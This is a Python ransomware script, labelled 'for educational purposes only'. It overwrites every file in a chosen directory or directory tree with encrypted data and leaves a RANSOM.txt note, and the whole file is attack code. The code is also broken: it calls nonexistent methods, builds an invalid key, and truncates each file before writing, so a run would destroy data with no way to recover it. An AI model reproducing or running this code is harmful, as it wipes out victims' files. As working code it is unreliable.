#!/usr/bin/env python3

"""Ransomware for educational purpuses only !!"""

icon = """\
█▀█ █▀█ ▀▀▀█ 
░▄▀ ░▄▀ ░░█░ 
█▄▄ █▄▄ ░▐▌░
"""

key_art = """

    ████████                    
  ██        ██                  
██            ██████████████████
██  ████                      ██
██  ████      ░░░░██░░██░░██░░██
██░░        ░░████  ██  ██  ██  
  ██░░░░░░░░██                  
    ████████                    

"""

from cryptography.fernet import Fernet 
import os 

def message():
    with open('RANSOM.txt', 'w') as ransom:
        ransom.write(key_art)
        ransom.write("Edit the message in main_ransomware.py")

def encrypt(dir) -> bool:
    content = os.listdir(dir)
    keys = []
    file_number = len(content)
    for i in range(100):
        keys.append(Fernet.generate_key())
    
    key = b''.join(keys)

    with open("key.key", "wb") as f:
        f.write(key)

    for file_id in range(len(content)):
        file_name = dir + "/" + content[file_id]

        if file_name.startwith(os.abspath(os.curdir)):
            continue

        if not os.path.isfile(file_name):
            file_number -= 1
            continue

        with open(file_name, 'wb') as encrypted_file:

            fernet = Fernet(key=key)
            encrypted_text = Fernet.encrypt(fernet, key)
            encrypted_file.write(encrypted_text) 

        advancment = (100 * (file_id + 1)) / file_number
        print(f"[{file_id + 1}/{file_number}]" + "[" + "#" * int(advancment) + " " * (100 - int(advancment)) + "]" , f"{advancment}%", f"Encrypting {file_name}...", end="\r")

    print("\n")
    message()
    return True


def recursive_encrypt(root) -> bool:
    print("Finding files...", end="")
    all_files = tuple(os.walk(root))
    print("Done", f"{len(all_files)} files found")
    keys = []

    print("Generating key...", end="")
    for i in range(100):
        keys.append(Fernet.generate_key())
    
    key = b''.join(keys)
    print("Done") 

    for dir_id in range(len(all_files)):

        for file_id in range(len(all_files[dir_id][2])):
            file_name = all_files[dir_id][0] + "/" + all_files[dir_id][2][file_id]

            if all_files[dir_id][2][file_id].startwith(os.abspath(os.curdir)):
                continue

            with open(file_name, 'wb') as encrypted_file:

                fernet = Fernet(key=key)
                encrypted_text = fernet.encrypt(key)
                encrypted_file.write(encrypted_text)
                
        total_advancment = int((100 * (dir_id + 1)) / len(all_files))
        current_folder = all_files[dir_id][0].split("/")[-1]
        print(f"[{dir_id + 1}/{len(all_files)}]" + "[" + "#" * total_advancment + " " * (100 - total_advancment) + "]", f"{total_advancment}%", f"Encrypting {current_folder}...", end="\r")
    print("")
    message()   
     
def main():
    decision = input("Do you want to encrypt a single directory (c) or do you want to encrypt all subdirectories from source (a) ? [c/a] ")

    if decision == 'c':
        dir = input("What directory do you wish to encrypt ? (RECOMMENDED: use absolute path): ")
        encrypt(dir)

    elif decision == 'a':
        root = input("From wich root file do you want to encrypt ? (RECOMMENDED: use absolute path): ")
        recursive_encrypt(root)
